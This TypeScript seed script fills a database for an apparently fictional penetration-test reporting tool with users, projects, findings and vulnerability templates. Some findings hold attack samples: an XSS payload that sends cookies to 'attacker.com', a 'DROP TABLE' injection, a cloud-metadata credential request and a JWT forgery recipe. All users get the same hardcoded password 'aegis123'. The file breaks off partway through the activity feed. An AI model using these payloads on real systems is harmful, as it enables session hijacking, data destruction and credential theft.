import { db } from './db';
import bcrypt from 'bcryptjs';

const HTML_TEMPLATE = `/* Technical Report — HTML Template */
/* Edit CSS variables below to customize the report appearance */
:root {
  --paper: #F5F1EA;
  --paper-alt: #EEE8DC;
  --ink: #1A1714;
  --muted: #8A817A;
  --rule: #D9D1C2;
  --brand: #D81E27;
  --brand-deep: #A8161C;
  --crit-bg: #F4D4D6; --crit-fg: #B11C24;
  --high-bg: #FBE6C9; --high-fg: #C06A10;
  --med-bg: #F3ECD4;  --med-fg: #8A6A1A;
  --low-bg: #DCE7D6;  --low-fg: #4C7A3A;
  --info-bg: #DDE3EA; --info-fg: #425A75;
  --serif: "Georgia", "Times New Roman", serif;
  --sans: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
  --mono: "JetBrains Mono", "Courier New", monospace;
  --page-pad-x: 56px;
  --page-pad-y: 66px;
  --body-size: 14.5px;
  --body-leading: 1.55;
  --display-size: 58px;
  --section-size: 38px;
  --finding-title-size: 28px;
}
`;

const LATEX_T1 = `% ────────────────────────────────────────────────────
% Aegis · Executive Summary template
% Engine: XeLaTeX · Class: aegis-report
% ────────────────────────────────────────────────────
\\documentclass[a4paper,11pt]{aegis-report}
\\usepackage{fontspec}
\\setmainfont{Fraunces}
\\setsansfont{Geist}
\\setmonofont{Geist Mono}

\\title{\\project{} — Executive Summary}
\\engagement{\\engagementtype}
\\period{\\startdate--\\enddate}
\\author{\\leadname, \\leadrole}

\\begin{document}
\\makecover

\\section*{Letter from the engagement lead}
\\body{\\execletter}

\\section{At a glance}
\\severitytable{\\findingcounts}
\\riskscore{\\overallrisk}

\\section{Top findings}
\\foreach \\f in \\topfindings{%
  \\findingcard{\\f}%
}

\\section{Recommended next steps}
\\roadmap{\\remediationplan}

\\makeappendix{scope=\\scopelist, method=\\methodology}
\\end{document}`;

const LATEX_T2 = `% ────────────────────────────────────────────────────
% Aegis · Technical Report template
% Engine: XeLaTeX · Class: aegis-report-full
% ────────────────────────────────────────────────────
\\documentclass[a4paper,10pt,twoside]{aegis-report-full}
\\usepackage{fontspec,listings,longtable,booktabs}
\\setmainfont{Fraunces}
\\setsansfont{Geist}
\\setmonofont{Geist Mono}

\\title{\\project{} — Technical Penetration Test}
\\begin{document}
\\makecover \\maketableofcontents

\\chapter{Executive Summary}
\\body{\\execsummary}

\\chapter{Methodology}
\\includestandard{ptes,owasp-wstg}
\\body{\\methodnarrative}

\\chapter{Findings Overview}
\\heatmap{\\findings}
\\severitytable{\\findingcounts}

\\chapter{Detailed Findings}
\\foreach \\f in \\findings{%
  \\begin{finding}{\\f.id}{\\f.title}{\\f.severity}
    \\cvss{\\f.vector}
    \\affected{\\f.assets}
    \\describe{\\f.description}
    \\reproduce{\\f.steps}
    \\evidence{\\f.evidence}
    \\impact{\\f.impact}
    \\remediate{\\f.remediation}
    \\references{\\f.refs}
  \\end{finding}%
}

\\appendix
\\chapter{Raw Scan Output}\\rawscans{\\scanartifacts}
\\end{document}`;

export async function seed() {
  console.log('Seeding database...');

  // ── Verify DB connection & schema before seeding ──────────────────────────
  try {
    await db.$queryRawUnsafe(`SELECT 1`);
  } catch (e) {
    throw new Error(`Database connection failed. Run migrations first: npx prisma migrate deploy\n${e}`);
  }
  try {
    await db.$queryRawUnsafe(`SELECT "executiveSummary" FROM "Project" LIMIT 0`);
  } catch {
    throw new Error('Schema mismatch: "Project"."executiveSummary" column missing. Run: npx prisma migrate deploy');
  }

  // Users
  const hash = (p: string) => bcrypt.hashSync(p, 10);
  const users = await Promise.all([
    db.user.upsert({ where: { email: 'kenji@aegis.internal' }, update: {}, create: { email: 'kenji@aegis.internal', name: 'Kenji Oduya', initials: 'KO', role: 'Lead Security Engineer', team: 'Offensive', password: hash('aegis123') } }),
    db.user.upsert({ where: { email: 'rami@aegis.internal' }, update: {}, create: { email: 'rami@aegis.internal', name: 'Rami Moreau', initials: 'RM', role: 'Senior Pentester', team: 'Offensive', password: hash('aegis123') } }),
    db.user.upsert({ where: { email: 'sofia@aegis.internal' }, update: {}, create: { email: 'sofia@aegis.internal', name: 'Sofia Johansson', initials: 'SJ', role: 'Cloud Security Engineer', team: 'Cloud', password: hash('aegis123') } }),
    db.user.upsert({ where: { email: 'ana@aegis.internal' }, update: {}, create: { email: 'ana@aegis.internal', name: 'Ana Whitfield', initials: 'AW', role: 'Associate Pentester', team: 'Offensive', password: hash('aegis123') } }),
    db.user.upsert({ where: { email: 'theo@aegis.internal' }, update: {}, create: { email: 'theo@aegis.internal', name: 'Theo Lange', initials: 'TL', role: 'AppSec Engineer', team: 'AppSec', password: hash('aegis123') } }),
    db.user.upsert({ where: { email: 'mira@aegis.internal' }, update: {}, create: { email: 'mira@aegis.internal', name: 'Mira Vos', initials: 'MV', role: 'Reporting Analyst', team: 'Reporting', password: hash('aegis123') } }),
  ]);
  const [KO, RM, SJ] = users;

  // Projects
  const p1scope = JSON.stringify([
    { asset: '*.helion.io', type: 'Web Application', notes: 'All subdomains in scope' },
    { asset: 'api-v3.helion.io', type: 'REST API', notes: 'v3 endpoints, JWT auth' },
    { asset: '*.auth.helion.io', type: 'OAuth / OIDC', notes: 'PKCE + refresh-token rotation' },
  ]);
  const p2scope = JSON.stringify([
    { asset: 'api.noriga.internal', type: 'REST API', notes: 'v2 endpoints, mTLS ingress' },
    { asset: 'iOS v4.8', type: 'Mobile Client', notes: 'Signed build 4.8' },
    { asset: 'Android v4.8', type: 'Mobile Client', notes: 'Signed build 4.8' },
  ]);
  const p3scope = JSON.stringify([
    { asset: 'aws:prod', type: 'AWS Account', notes: 'Production environment' },
    { asset: 'aws:staging', type: 'AWS Account', notes: 'Staging environment' },
    { asset: 'terraform:infra', type: 'IaC', notes: 'Infrastructure-as-code review' },
  ]);

  const p1 = await db.project.upsert({ where: { code: 'HLN-26Q1' }, update: {}, create: { code: 'HLN-26Q1', name: 'Helion Core Platform', engagement: 'External Web Application', scope: p1scope, executiveSummary: 'Over six weeks, a grey-box penetration test was conducted against the Helion Core Platform. The assessment identified multiple critical vulnerabilities in the authentication layer, including a JWT key confusion attack that permits complete authentication bypass. Immediate remediation of critical and high findings is recommended before the next production release.', status: 'in-progress', progress: 62, startDate: '2026-03-14', endDate: '2026-04-30', leadId: KO.id } });
  const p2 = await db.project.upsert({ where: { code: 'NRX-26Q1' }, update: {}, create: { code: 'NRX-26Q1', name: 'Noriga Payments API', engagement: 'Internal API + Mobile', scope: p2scope, executiveSummary: 'The Noriga Payments API assessment identified two critical vulnerabilities in the identity plane, both reachable from the internal network. A critical unauthenticated admin endpoint permits JWT signing-key rotation by any network-adjacent caller, and a high-severity algorithm-confusion flaw allows forged session tokens. Both issues require immediate remediation.', status: 'in-review', progress: 88, startDate: '2026-02-10', endDate: '2026-04-18', leadId: RM.id } });
  const p3 = await db.project.upsert({ where: { code: 'ATL-26Q1' }, update: {}, create: { code: 'ATL-26Q1', name: 'Atlas Cloud Infrastructure', engagement: 'AWS Configuration Review', scope: p3scope, executiveSummary: 'The AWS configuration review of Atlas Cloud Infrastructure identified several misconfigurations in IAM roles and S3 bucket policies. No critical vulnerabilities were found. All identified issues have been remediated as part of this engagement.', status: 'completed', progress: 100, startDate: '2026-01-20', endDate: '2026-03-02', leadId: SJ.id } });
  const p4 = await db.project.upsert({ where: { code: 'BRM-26Q1' }, update: {}, create: { code: 'BRM-26Q1', name: 'Brambling Retail Suite', engagement: 'PCI-DSS Annual', scope: JSON.stringify([{ asset: 'pos.brambling.net', type: 'POS System', notes: 'Payment terminals' }, { asset: 'backoffice.brambling.net', type: 'Web Application', notes: 'Admin panel' }]), executiveSummary: '', status: 'waiting-client', progress: 24, startDate: '2026-04-05', endDate: '2026-05-20', leadId: KO.id } });
  await db.project.upsert({ where: { code: 'SLV-26Q1' }, update: {}, create: { code: 'SLV-26Q1', name: 'Silvermark Identity Broker', engagement: 'OAuth/OIDC Audit', scope: JSON.stringify([{ asset: 'idp.silvermark.com', type: 'Identity Provider', notes: 'OAuth 2.0 / OIDC' }, { asset: 'SDK v2.x', type: 'Client SDK', notes: 'JavaScript + mobile SDKs' }]), executiveSummary: '', status: 'scheduled', progress: 0, startDate: '2026-05-02', endDate: '2026-06-14', leadId: RM.id } });

  // Findings for p1
  const findingData = [
    { code: 'F-014', projectId: p1.id, title: 'Authentication bypass via malformed JWT kid header', severity: 'critical', status: 'open', cvss: 9.1, cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N', cwe: 'CWE-287', owasp: 'A07:2021', component: 'auth-service', assets: JSON.stringify(['api-v3.helion.io/auth/verify']), assigneeId: KO.id, summary: 'The JWT verifier resolves the signing key from the untrusted `kid` header without a whitelist, enabling key-confusion to a server-local public key file and full authentication bypass.', description: `## Description\n\nThe JWT verifier resolves the signing key from the untrusted \`kid\` header without a whitelist, enabling key-confusion to a server-local public key file and full authentication bypass.\n\n## Technical Details\n\nThe \`/auth/verify\` endpoint accepts a JSON Web Token and verifies its signature. The \`kid\` (Key ID) header parameter is used to select the signing key, but the implementation does not validate that the \`kid\` refers to a legitimate key in the server's keystore.\n\nAn attacker can craft a JWT with a \`kid\` pointing to a known file on the server (e.g., \`/dev/null\` or a public key file) and sign it with the corresponding content. The server will then verify the signature against that file's contents rather than a legitimate key.`, reproduction: `1. Obtain a valid JWT from the application\n2. Decode the JWT header and note the \`kid\` field\n3. Craft a new JWT with \`kid\` set to \`/dev/null\` and algorithm \`HS256\`\n4. Sign the JWT with an empty string (contents of /dev/null)\n5. Send the crafted JWT to \`/auth/verify\`\n6. Observe that the server accepts it as valid`, impact: 'Complete authentication bypass. An attacker can forge tokens for any user including administrators, gaining full access to all resources.', remediation: `1. Implement a strict allowlist of valid key IDs\n2. Never use untrusted input to resolve cryptographic keys\n3. Consider using a well-tested JWT library that handles key selection securely\n4. Rotate all existing signing keys immediately`, discovered: '2026-04-02' },
    { code: 'F-013', projectId: p1.id, title: 'Server-side request forgery in webhook validator', severity: 'critical', status: 'in-review', cvss: 8.6, cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N', cwe: 'CWE-918', owasp: 'A10:2021', assets: JSON.stringify(['api-v3.helion.io/webhooks/test']), assigneeId: RM.id, summary: 'The outbound webhook tester does not enforce an allow-list on destination hosts, permitting requests to IMDS and internal services.', description: `## Description\n\nThe webhook test endpoint allows authenticated users to specify arbitrary URLs for outgoing HTTP requests. There is no allowlist validation of destination hosts.\n\n## Technical Details\n\nThe endpoint \`POST /webhooks/test\` accepts a \`url\` parameter and makes an outgoing HTTP request to that URL. This allows internal network access.`, reproduction: `1. Authenticate as any valid user\n2. POST to /webhooks/test with body: {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}\n3. Observe AWS IAM credentials returned in the response`, impact: 'Access to AWS Instance Metadata Service (IMDS), internal microservices, and potential credential theft leading to cloud account compromise.', remediation: 'Implement strict allowlist validation of webhook destination URLs. Block RFC-1918 addresses and link-local ranges.', discovered: '2026-04-05' },
    { code: 'F-012', projectId: p1.id, title: 'Stored XSS in shared dashboard annotation', severity: 'high', status: 'open', cvss: 7.4, cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N', cwe: 'CWE-79', owasp: 'A03:2021', assets: JSON.stringify(['app.helion.io/dashboard/*']), assigneeId: KO.id, summary: 'Annotation text is rendered without contextual escaping when shared across tenants; a crafted payload executes in the viewer tenant.', description: '## Description\n\nThe dashboard annotation feature allows users to add notes that are visible to other team members. These annotations are rendered as HTML without proper sanitization.', reproduction: '1. Add annotation: `<img src=x onerror="fetch(\'https://attacker.com/\'+document.cookie)">`\n2. Share the dashboard with another user\n3. When victim views the dashboard, cookies are exfiltrated', impact: 'Session hijacking, account takeover, cross-tenant data access.', remediation: 'Sanitize all user-supplied content with a library like DOMPurify before rendering. Use Content Security Policy headers.', discovered: '2026-04-07' },
    { code: 'F-011', projectId: p1.id, title: 'Insecure direct object reference on invoice export', severity: 'high', status: 'open', cvss: 7.1, cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N', cwe: 'CWE-639', owasp: 'A01:2021', assets: JSON.stringify(['api-v3.helion.io/billing/invoices/{id}']), assigneeId: SJ.id, summary: 'Sequential invoice IDs are not checked against tenant ownership; any authenticated user can export any invoice by incrementing the identifier.', description: '## Description\n\nThe billing API uses sequential integer IDs for invoices. Authorization checks verify only that the user is authenticated, not that the invoice belongs to their tenant.', reproduction: '1. Authenticate and download your own invoice: GET /billing/invoices/1000\n2. Increment the ID: GET /billing/invoices/999\n3. Observe another tenant\'s invoice is returned', impact: 'Full read access to all customer invoices across all tenants. May expose financial data, company names, and contact details.', remediation: 'Implement proper authorization checks verifying tenant ownership for every resource access. Use UUID-based IDs to prevent enumeration.', discovered: '2026-04-08' },
    { code: 'F-010', projectId: p1.id, title: 'Weak password reset token entropy', severity: 'high', status: 'resolved', cvss: 6.9, cvssVector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N', cwe: 'CWE-330', owasp: 'A07:2021', assets: JSON.stringify(['auth.helion.io/reset']), assigneeId: RM.id, summary: 'Password reset tokens derive from Math.random(); effective entropy ≈ 42 bits making brute-force feasible within token TTL.', description: '## Description\n\nPassword reset tokens are generated using `Math.random()` which provides approximately 42 bits of entropy. With a 24-hour TTL, brute-force attacks are feasible.', reproduction: '1. Request a password reset for a target account\n2. Generate tokens using Math.random() seeded with the approximate timestamp\n3. Test generated tokens against /auth/reset endpoint\n4. Achieve account takeover within TTL window', impact: 'Account takeover for any user. An attacker can brute-force reset tokens and gain unauthorized access.', remediation: 'Use `crypto.randomBytes(32)` or equivalent CSPRNG. Implement short TTL (< 1 hour) and rate limiting on the reset endpoint.', discovered: '2026-03-28' },
    { code: 'F-009', projectId: p1.id, title: 'Outdated TLS configuration on legacy endpoint', severity: 'medium', status: 'open', cvss: 5.3, cvssVector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N', cwe: 'CWE-326', owasp: 'A02:2021', assets: JSON.stringify(['legacy.helion.io']), assigneeId: KO.id, summary: 'TLS 1.0/1.1 are still negotiable on the legacy gateway; several weak cipher suites are offered.', description: '## Description\n\nThe legacy gateway endpoint supports deprecated TLS versions and weak cipher suites, exposing connections to downgrade attacks.', reproduction: '1. Run: `openssl s_client -connect legacy.helion.io:443 -tls1`\n2. Observe successful handshake with TLS 1.0\n3. Run: `nmap --script ssl-enum-ciphers -p 443 legacy.helion.io`\n4. Note weak ciphers including RC4 and 3DES', impact: 'Susceptibility to POODLE, BEAST, and other downgrade attacks. Potential interception of sensitive data in transit.', remediation: 'Disable TLS 1.0 and 1.1. Remove all weak cipher suites. Configure only TLS 1.2+ with strong cipher suites (ECDHE + AES-GCM).', discovered: '2026-04-01' },
    { code: 'F-008', projectId: p1.id, title: 'Verbose error pages leak stack traces', severity: 'medium', status: 'in-review', cvss: 5.0, cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N', cwe: 'CWE-209', owasp: 'A05:2021', assets: JSON.stringify(['app.helion.io/*']), assigneeId: KO.id, summary: 'Unhandled exceptions emit full stack traces, disclosing framework versions and internal paths.', description: '## Description\n\nApplication errors in production mode return full stack traces including framework version information, internal file paths, and function names.', reproduction: '1. Send a malformed request to any API endpoint\n2. Observe the response contains a full Node.js stack trace\n3. Extract framework versions and internal path information', impact: 'Information disclosure aiding further exploitation. Exposes internal architecture details.', remediation: 'Configure proper error handling middleware. Never expose stack traces in production. Log errors server-side only and return generic error messages to clients.', discovered: '2026-04-03' },
    { code: 'F-007', projectId: p1.id, title: 'Rate limit bypass via header rotation', severity: 'medium', status: 'open', cvss: 4.7, cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L', cwe: 'CWE-770', owasp: 'A04:2021', assets: JSON.stringify(['api-v3.helion.io/auth/login']), assigneeId: SJ.id, summary: 'Login throttling keys on X-Forwarded-For; rotating that header resets the counter and enables credential stuffing.', description: '## Description\n\nThe login rate limiter uses the `X-Forwarded-For` header as the key for rate limiting. An attacker can rotate this header value to bypass rate limiting entirely.', reproduction: '1. Attempt 10 login requests to trigger rate limiting\n2. Add `X-Forwarded-For: 1.2.3.4` to the next request\n3. Observe rate limit is reset\n4. Continue with credential stuffing attack', impact: 'Enables credential stuffing attacks without rate limiting protection. May lead to account compromise at scale.', remediation: 'Use the actual client IP address (socket address) for rate limiting, not untrusted headers. If behind a load balancer, configure it to set a trusted IP header.', discovered: '2026-04-06' },
    { code: 'F-006', projectId: p1.id, title: 'Session cookie missing SameSite attribute', severity: 'low', status: 'resolved', cvss: 3.1, cvssVector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N', cwe: 'CWE-1275', owasp: 'A05:2021', assets: JSON.stringify(['auth.helion.io']), assigneeId: RM.id, summary: 'The session cookie is emitted without SameSite, exposing the app to narrow CSRF scenarios.', description: '## Description\n\nSession cookies are set without the `SameSite` attribute, which defaults to `None` in older browsers and `Lax` in modern ones. This exposes the application to CSRF in certain scenarios.', reproduction: '1. Log in and inspect the Set-Cookie header\n2. Observe absence of SameSite attribute\n3. Construct a cross-site form submission targeting a state-changing endpoint', impact: 'Limited CSRF risk in modern browsers. Older browsers may be vulnerable to cross-site request forgery attacks.', remediation: 'Set `SameSite=Strict` or `SameSite=Lax` on all session cookies. Also set `Secure` and `HttpOnly` flags.', discovered: '2026-03-30' },
  ];

  for (const f of findingData) {
    const existing = await db.finding.findFirst({ where: { code: f.code, projectId: f.projectId } });
    if (!existing) await db.finding.create({ data: f });
  }

  // Findings for p2
  const p2FindingData = [
    { code: 'F-P2-001', projectId: p2.id, title: 'Broken object level authorization on payment endpoints', severity: 'critical', status: 'open', cvss: 9.0, cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N', cwe: 'CWE-639', owasp: 'A01:2021', assets: JSON.stringify(['api.noriga.internal/v2/payments']), assigneeId: RM.id, summary: 'Payment records can be accessed and modified by any authenticated user by manipulating payment IDs.', description: '## Description\n\nPayment API endpoints lack proper authorization checks at the object level. Authenticated users can access and modify payment records belonging to other accounts.', reproduction: '1. Create a payment and note its ID\n2. Change your authentication token to another account\n3. Access /v2/payments/{id} with the original payment ID\n4. Observe full access to the other account\'s payment data', impact: 'Unauthorized access to financial records. Potential fund manipulation across all customer accounts.', remediation: 'Implement BOLA/IDOR protection by always verifying that the authenticated user owns the requested resource.', discovered: '2026-03-15' },
    { code: 'F-P2-002', projectId: p2.id, title: 'Hardcoded API key in mobile app binary', severity: 'high', status: 'open', cvss: 7.5, cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', cwe: 'CWE-798', owasp: 'A02:2021', assets: JSON.stringify(['iOS v4.8', 'Android v4.8']), assigneeId: RM.id, summary: 'Backend API keys hardcoded in mobile app binary allow unauthenticated API access.', description: '## Description\n\nReverse engineering the mobile app binary reveals hardcoded API keys used to authenticate with the backend.', reproduction: '1. Download the app APK/IPA\n2. Decompile using jadx/frida\n3. Search for API key patterns\n4. Use extracted key to make unauthenticated API calls', impact: 'Unauthenticated access to backend APIs. Key cannot be easily rotated without app update.', remediation: 'Remove hardcoded secrets. Use certificate pinning and runtime key fetching with proper authentication.', discovered: '2026-03-20' },
  ];

  for (const f of p2FindingData) {
    const existing = await db.finding.findFirst({ where: { code: f.code, projectId: f.projectId } });
    if (!existing) await db.finding.create({ data: f });
  }

  // Vuln templates
  const vulnTemplates = [
    { code: 'V-2024-0181', title: 'SQL injection via unparameterized ORDER BY clause', cwe: 'CWE-89', severity: 'critical', owner: 'AppSec', uses: 14, description: '## Description\n\nSQL injection vulnerability exists when user-supplied input is directly interpolated into ORDER BY clauses without parameterization.', reproduction: 'Append `; DROP TABLE users--` to sort parameter', impact: 'Full database read/write access, potential RCE via xp_cmdshell or UDF.', remediation: 'Use a whitelist of permitted column names. Never interpolate user input into ORDER BY clauses.' },
    { code: 'V-2024-0180', title: 'Cross-site scripting — stored (CKEditor inline)', cwe: 'CWE-79', severity: 'high', owner: 'AppSec', uses: 22, description: '## Description\n\nStored XSS via CKEditor rich text fields that lack server-side sanitization.', reproduction: 'Insert `<script>alert(1)</script>` in rich text field', impact: 'Session hijacking, defacement, malware distribution.', remediation: 'Server-side HTML sanitization with DOMPurify or similar. Configure CSP headers.' },
    { code: 'V-2024-0179', title: 'SSRF via image proxy', cwe: 'CWE-918', severity: 'critical', owner: 'AppSec', uses: 9, description: '## Description\n\nServer-Side Request Forgery through an image proxy endpoint with no host allowlist.', reproduction: 'Submit http://169.254.169.254/latest/meta-data/ as image URL', impact: 'Internal network access, IMDS credential theft, lateral movement.', remediation: 'Implement strict URL allowlisting. Block RFC-1918 and link-local ranges.' },
    { code: 'V-2024-0178', title: 'IDOR on multi-tenant resource routes', cwe: 'CWE-639', severity: 'high', owner: 'AppSec', uses: 31, description: '## Description\n\nInsecure Direct Object Reference on multi-tenant resource endpoints.', reproduction: 'Increment/change resource ID in URL', impact: 'Cross-tenant data access and modification.', remediation: 'Implement ownership verification for every resource access. Use UUIDs to prevent enumeration.' },
    { code: 'V-2024-0177', title: 'Weak JWT — algorithm confusion', cwe: 'CWE-347', severity: 'critical', owner: 'Auth', uses: 6, description: '## Description\n\nJWT implementation vulnerable to algorithm confusion attacks (RS256 → HS256).', reproduction: 'Convert RSA public key to HMAC secret and sign tokens with HS256', impact: 'Complete authentication bypass.', remediation: 'Enforce algorithm allowlisting. Never accept alg:none. Use a well-tested JWT library.' },
    { code: 'V-2024-0176', title: 'Overly permissive CORS origin echo', cwe: 'CWE-942', severity: 'medium', owner: 'AppSec', uses: 18, description: '## Description\n\nCORS configuration echoes any Origin header, allowing cross-origin requests from arbitrary domains.', reproduction: 'Set Origin: https://evil.com and observe it\'s reflected in Access-Control-Allow-Origin', impact: 'Cross-origin data theft if combined with credential sharing.', remediation: 'Maintain explicit allowlist of permitted origins. Never echo the Origin header unconditionally.' },
    { code: 'V-2024-0175', title: 'S3 bucket: public list + readable objects', cwe: 'CWE-732', severity: 'high', owner: 'Cloud', uses: 12, description: '## Description\n\nS3 bucket configured with public read access allowing unauthenticated object listing and downloading.', reproduction: 'curl https://s3.amazonaws.com/{bucket}?list-type=2', impact: 'Exposure of sensitive data stored in S3.', remediation: 'Block all public access via S3 Block Public Access settings. Review bucket policies and ACLs.' },
    { code: 'V-2024-0174', title: 'IAM role trust policy allows wildcard principal', cwe: 'CWE-284', severity: 'high', owner: 'Cloud', uses: 7, description: '## Description\n\nIAM role trust policy uses wildcard (*) for principal, allowing any AWS principal to assume the role.', reproduction: 'aws sts assume-role --role-arn {arn} --role-session-name test', impact: 'Unauthorized role assumption leading to privilege escalation.', remediation: 'Replace wildcard principals with specific AWS account IDs or service principals.' },
    { code: 'V-2024-0173', title: 'Password reset token reuse', cwe: 'CWE-640', severity: 'high', owner: 'Auth', uses: 15, description: '## Description\n\nPassword reset tokens remain valid after use, allowing replay attacks.', reproduction: '1. Request reset token\n2. Use token to reset password\n3. Reuse same token again - observe it still works', impact: 'Account takeover if attacker intercepts reset link.', remediation: 'Invalidate reset tokens immediately after use. Implement single-use tokens.' },
    { code: 'V-2024-0172', title: 'Verbose error disclosure', cwe: 'CWE-209', severity: 'medium', owner: 'AppSec', uses: 40, description: '## Description\n\nApplication returns verbose error messages including stack traces, internal paths, and version information.', reproduction: 'Send malformed request and observe error response', impact: 'Information disclosure aiding further attacks.', remediation: 'Implement generic error responses in production. Log details server-side only.' },
    { code: 'V-2024-0171', title: 'Clickjacking — missing frame-ancestors', cwe: 'CWE-1021', severity: 'low', owner: 'AppSec', uses: 28, description: '## Description\n\nApplication does not set Content-Security-Policy frame-ancestors or X-Frame-Options, allowing clickjacking.', reproduction: 'Embed application in iframe on attacker-controlled page', impact: 'UI redressing attacks tricking users into unintended actions.', remediation: 'Add CSP: frame-ancestors \'none\' or X-Frame-Options: DENY header.' },
    { code: 'V-2024-0170', title: 'TLS — weak cipher suites enabled', cwe: 'CWE-326', severity: 'medium', owner: 'Infra', uses: 35, description: '## Description\n\nTLS configuration enables deprecated cipher suites including RC4, 3DES, and export-grade ciphers.', reproduction: 'nmap --script ssl-enum-ciphers -p 443 {host}', impact: 'Susceptibility to BEAST, POODLE, SWEET32 attacks.', remediation: 'Configure only TLS 1.2+ with strong cipher suites. Disable all export-grade and null ciphers.' },
  ];

  for (const v of vulnTemplates) {
    const existing = await db.vulnTemplate.findUnique({ where: { code: v.code } });
    if (!existing) await db.vulnTemplate.create({ data: v });
  }

  // Report templates — HTML-based
  // Order matters: reportData references createdTemplates[0/1/2] by index
  // [0] = Executive Summary, [1] = Technical Report, [2] = Remediation Playbook
  const reportTemplates = [
    { name: 'Executive Summary',     audience: 'Executive',   pages: '10+', tone: 'Summary',     engine: 'HTML', source: HTML_TEMPLATE },
    { name: 'Technical Report',      audience: 'Engineering', pages: '40+', tone: 'Detailed',    engine: 'HTML', source: HTML_TEMPLATE },
    { name: 'Remediation Playbook',  audience: 'Engineering', pages: '20+', tone: 'Remediation', engine: 'HTML', source: HTML_TEMPLATE },
  ];

  const createdTemplates: Array<{ id: string }> = [];
  for (const t of reportTemplates) {
    const existing = await db.reportTemplate.findFirst({ where: { name: t.name } });
    if (existing) {
      createdTemplates.push(existing);
    } else {
      createdTemplates.push(await db.reportTemplate.create({ data: t }));
    }
  }

  // Reports
  const reportData = [
    { code: 'R-0042', projectId: p1.id, templateId: createdTemplates[0].id, templateName: 'Executive Summary', version: 'v3', status: 'draft', authorId: users[5].id, pages: 9, size: '2.4 MB' },
    { code: 'R-0041', projectId: p1.id, templateId: createdTemplates[1].id, templateName: 'Technical Report', version: 'v2', status: 'final', authorId: KO.id, pages: 62, size: '14.8 MB' },
    { code: 'R-0040', projectId: p2.id, templateId: createdTemplates[1].id, templateName: 'Technical Report', version: 'v1', status: 'review', authorId: RM.id, pages: 48, size: '9.1 MB' },
    { code: 'R-0039', projectId: p2.id, templateId: createdTemplates[2].id, templateName: 'Remediation Playbook', version: 'v1', status: 'final', authorId: users[5].id, pages: 18, size: '3.2 MB' },
    { code: 'R-0038', projectId: p3.id, templateId: createdTemplates[1].id, templateName: 'Technical Report', version: 'v2', status: 'final', authorId: SJ.id, pages: 54, size: '11.2 MB' },
    { code: 'R-0037', projectId: p3.id, templateId: createdTemplates[0].id, templateName: 'Executive Summary', version: 'v2', status: 'final', authorId: users[5].id, pages: 8, size: '2.8 MB' },
    { code: 'R-0035', projectId: p4.id, templateId: createdTemplates[0].id, templateName: 'Executive Summary', version: 'v1', status: 'draft', authorId: KO.id, pages: 7, size: '1.8 MB' },
  ];

  for (const r of reportData) {
    const existing = await db.report.findUnique({ where: { code: r.code } });
    if (!existing) await db.report.create({ data: r });
  }

  // Activity feed — seed representative activity across users/projects
  const existingActivity = await db.activity.count();
  if (existingActivity === 0) {
    const [AW, TL, MV] = [users[3], users[4], users[5]];
    const now = Date.now();
    const ago = (minutes: number) => new Date(now - minutes * 60 * 1000);

    const findings = await db.finding.findMany({ where: { projectId: p1.id }, orderBy: { createdAt: 'asc' } });
    const f014 = findings.find(f => f.code === 'F-014');
    const f013 = findings.find(f => f.code === 'F-013');
    const f012 = findings.find(f => f.code === 'F-012');
    const f009 = findings.find(f => f.code === 'F-009');

    const p2findings = await db.finding.findMany({ where: { projectId: p2.id } });
    const fp2a = p2findings[0];
    const fp2b = p2findings[1];

    const activities = [
      // Recent — KO starts new project
      { userId: KO.id, projectId: p4.id, action: 'created', target: 'Brambling Retail Suite', detail: 'PCI-DSS Annual engagement kicked off', badge: 'PROJECT', createdAt: ago(15) },
      // MV generates report
      { userId: MV.id, projectId: p1.id, action: 'generated', target: 'R-0042 Executive Summary', detail: 'v3 draft generated', badge: 'REPORT', createdAt: ago(42) },
      // KO adds critical finding
      ...(f014 ? [{ userId: KO.id, projectId: p1.id, findingId: f014.id, action: 'created', target: f014.title, badge: 'CRITICAL', createdAt: ago(90) }] : []),
      // RM adds critical finding
      ...(f013 ? [{ userId: RM.id, projectId: p1.id, findingId: f013.id, action: 'created', target: f013.title, badge: 'CRITICAL', createdAt: ago(135) }] : []),
      // AW updates finding status
      ...(f012 ? [{ userId: AW.id, projectId: p1.id, findingId: f012.id, action: 'updated', target: f012.title, detail: 'status', badge: 'UPDATED', createdAt: ago(200) }] : []),
      // TL adds finding
      ...(f009 ? [{ userId: TL.id, projectId: p1.id, findingId: f009.id, action: 'created', target: f009.title, badge: 'MEDIUM', createdAt: ago(300) }] : []),
      // SJ starts p3 project
      { userId: SJ.id, projectId: p3.id, action: 'created', target: 'Atlas Cloud Infrastructure', detail: 'AWS Configuration Review started', badge: 'PROJECT', createdAt: ago(480) },
      // RM generates report for p2
      { userId: RM.id, projectId: p2.id, action: 'generated', target: 'R-0040 Technical Report', detail: 'v1 generated for review', badge: 'REPORT', createdAt: ago(600) },
      // RM adds p2 finding
      ...(fp2a ? [{ userId: RM.id, projectId: p2.id, findingId: fp2a.id, action: 'created', target: fp2a.title, badge: 'CRITICAL', createdAt: ago(720) }] : []),
      // RM adds p2 finding b
      ...(fp2b ? [{ userId: RM.id, projectId: p2.id, findingId: fp2b.id, action: 'created', target: fp2b.title, badge: 'HIGH', createdAt: ago(900) }] : []),
      // MV finalizes report
      { userId: MV.id, projectId: p3.id, action: 'generated', target: 'R-0037 Executive Summary', detail: 'v2 finalized', badge: 'REPORT', createdAt: ago(1200) },
      // KO marks finding resolved
